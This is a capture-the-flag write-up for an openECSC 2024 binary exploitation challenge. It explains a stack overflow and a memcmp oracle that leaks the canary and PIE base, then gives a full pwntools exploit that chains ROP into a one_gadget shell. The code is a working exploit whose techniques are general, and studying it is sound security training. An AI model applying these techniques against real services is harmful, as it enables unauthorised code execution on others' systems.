# openECSC 2024 - Round 2

## [pwn] Yer another guessing game (95 solves)

The title says it all. Guess the secret!

`nc yetanotherguessinggame.challs.open.ecsc2024.it 38010`

Author: Giulia Martino <@Giulia>

## Overview
The challenge binary is very small and simple. The challenge starts by opening `/dev/urandom`, reads some bytes from it and stores them into a stack buffer, the `secret`. Then a loop starts, and the user is asked to guess the secret at each iteration; the challenge then compares the user's input with the secret buffer, printing `You win!` or `You lose!` depending on the result. It also lets the user choose if they want to go on guessing or not, and it breaks the loop and returns in case the user wants to stop. All protections are enabled on the binary:

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution
When the challenge asks for user input, it calls `read(0, input, 0x68)`. Considering the input buffer is only `0x28` bytes, it is possible to perform a stack buffer overflow `0x40` bytes past our `input` buffer, meaning we can fully overwrite the `secret` buffer and also get to the return address. Considering all protections are enabled, some leaks are needed before we can proceed: we must leak the canary to defeat the stack smashing detection and we also need a pie leak / libc leak to actually overwrite the return address. 

The program checks if the input and secret match in a very weird way:

```c
memcmp(input, secret, strlen(input))
```

The size of the comparison changes depending on our input instead of being set to the size of the `secret` buffer. The challenge reads any byte from `stdin` and does not stop at null bytes; this means we can use the result of the comparison as an oracle to leak bytes from the stack. To better explain how, let's suppose both `input` and `secret` were 0x8 bytes long, and were located in the stack like below: 

```
0x00    0x41 0x41 0x41 0x41 0x41 0x41 0x00 0x01        <--- input
0x08    0x56 0x44 0xa3 0x32 0xb5 0x4d 0xf6 0xd2        <--- secret
```

With these the values in the two buffers, this would happen when `memcmp(input, secret, strlen(input))` is executed:
1. the value `strlen(input)` is computed first. the layout is little endian, and `strlen` stops at the first null byte. so, `strlen(input) = 1`.
2. the program then calls `memcmp(input, secret, 1)`, which compares the first byte of `input` with the first byte of `secret`; since `0x01 != 0xd2`, it returns false.
3. the challenge prints `You lose!`

The same would happen if the first byte of `input` was set to `0x02`, `0x03`, `0x04`, and so on. But we are inside an infinite loop, and we can change our input how many times we want. So we can go on trying *every* byte from `0x01` to `0xff` until we actually get `You win!` as the output. When we do, it means we found the first byte of the `secret`. Then we can set that byte and move the null byte one byte forward:

```
0x00    0x41 0x41 0x41 0x41 0x41 0x00 0x01 0xd2        <--- input
0x08    0x56 0x44 0xa3 0x32 0xb5 0x4d 0xf6 0xd2        <--- secret
```

and try again all the possible values from `0x01` to `0xff` until we get the correct byte. This process can be iterated forever, until we find all the bytes of the secret.

This trick is very cool, but leaking the secret it's actually not useful at all. What we can do, though, is using the exact same trick to leak the other blocks of the stack as well. This is the real stack layout:

```
0x00    input[0:8]
0x08    input[8:16]
0x10    input[16:24]
0x18    input[24:32]
0x20    input[32:40]
0x28    secret[0:8]
0x30    secret[8:16]
0x38    canary
0x40    rbp
0x48    ret addr
0x50    greeting string[0:8]
0x58    greeting string[8:16]
0x60    greeting string[16:24]
0x68    ...
```

The maximum size of our input is `0x68`, which means we can get both to the canary and the saved return address. There is no libc address on the stack that we can reach, so that cannot be leaked with this same trick.

After leaking the canary and the return address we can easily compute pie base by just subtracting the pie leak offset from the pie leak itself. At this point, we can use a tool like `ropper` or `ROPGadget` to search for ROP gadgets. It's quick to notice that the binary doesn't have any syscall gadget, so getting the flag from just ROPping inside the binary seems not possible: we need a libc leak.  

A possible solution consists in building a small ROP chain that calls `puts` to print a GOT entry and get a libc leak. Luckily, the binary has the perfect gadget for that:

```
0x0000000000001503: pop rdi; ret;
```

After we got the GOT leak, we can ROP back to the `game` function, so that the program will ask us again for input and we can use the libc leak to perform the second stage of the attack. The first chain looks like this:

```
POP_RDI = pie_base + 0x0000000000001503
ropchain = p64(POP_RDI)
ropchain += p64(exe.got["puts"])
ropchain += p64(exe.plt["puts"])
ropchain += p64(exe.sym.game)
```

Now that the entire libc is available, the second ROP chain can just return to `one_gadget` and get a shell.

```
ONE_GADGET = libc_base + 0xe3b01        # execve("/bin/sh", r15, rdx)
ropchain = p64(ONE_GADGET)
```

Since both `$r15` and `$rdx` are already set to zero, no additional tweak is needed.

## Exploit
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
from pwn import *

HOST = os.environ.get("HOST", "yetanotherguessinggame.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38010))

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
exe = context.binary = ELF(os.path.join(os.path.dirname(__file__), 'build/yet_another_guessing_game'), checksec=False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

def play(payload, io, next=True):
    io.sendafter(b'Guess the secret!\n', payload)
    next = b"y" if next else b"n"
    res = True if b"You win!" in io.recvline() else False
    io.sendafter(b"Wanna play again? (y/n)\n", next)
    return res

def brute_block(io, padding, block_prefix, block_len):
    block = b""
    while True:
        found = False
        for c in range(1, 256):
            guess = block_prefix + block + p8(c) + b"\x00"
            guess = guess + b"A" * (0x8 - len(guess))

            payload = padding                                   # input
            payload += guess                                    # input
            payload += b"A" * (0x28 - len(payload))             # input
            payload += padding                                  # secret starts here
            payload += block_prefix + block

            if play(payload, io):
                found = True
                block += p8(c)
                print(f"[+] found {len(block)}/{block_len}")
                break

        if not found:
            return None

        if len(block) == block_len:
            break

    return block

MAX_ATTEMPTS = 10
for attempt in range(1, MAX_ATTEMPTS + 1):
    found = False
    print(f"[*] attempt {attempt}/{MAX_ATTEMPTS}")
    io = start()

    # Overwrite canary nullbyte
    payload = b"A" * 0x28           # input
    payload += b"B" * 0x10          # secret
    payload += b"D"                 # canary null byte
    play(payload, io)

    # Leak canary
    print("[*] bruting canary")
    try:
        canary = brute_block(io, cyclic(0x10), b"A", 7)
    except:
        canary = None

    if canary is None:
        print(f"[-] attempt {attempt} failed")
        io.close()
        continue

    canary = u64(b"\x00" + canary)
    print(f"[+] canary: {hex(canary)}")

    # Leak pie
    print("[*] bruting pie")
    try:
        leak = brute_block(io, cyclic(0x20), b"", 6)
    except:
        leak = None

    if leak is None:
        print(f"[-] attempt {attempt} failed")
        io.close()
        continue

    found = True
    break

if not found:
    print("[-] all attempts failed :(")
    exit()

leak = u64(leak + b"\x00\x00")
print(f"[+] leak: {hex(leak)}")
LEAK_OFFS = 0x1483
pie_base = leak - LEAK_OFFS
print(f"[+] pie_base: {hex(pie_base)}")

exe.address = pie_base
payload = b"A" * 0x10
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += b"A" * 0x10
payload += p64(canary)      # canary
payload += p64(0x0)         # rbp

POP_RDI = pie_base + 0x0000000000001503
ropchain = p64(POP_RDI)
ropchain += p64(exe.got["puts"])
ropchain += p64(exe.plt["puts"])
ropchain += p64(exe.sym.game)
payload += ropchain
play(payload, io, False)
io.recvuntil(b"Goodbye!\n")
leak = u64(io.recvline()[:-1].ljust(8, b"\x00"))
print(f"[+] puts: {hex(leak)}")
PUTS_OFFS = 0x84420
libc_base = leak - PUTS_OFFS
print(f"[+] libc_base: {hex(libc_base)}")

payload = b"A" * 0x10
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += b"A" * 0x10
payload += p64(canary)      # canary
payload += p64(0x0)         # rbp

ONE_GADGET = libc_base + 0xe3b01        # execve("/bin/sh", r15, rdx)
ropchain = p64(ONE_GADGET)

payload += ropchain
play(payload, io, False)
io.recvuntil(b"Goodbye!\n")
time.sleep(1)
io.sendline(b"cat flag")
res = io.clean(1)
print(res.decode())

```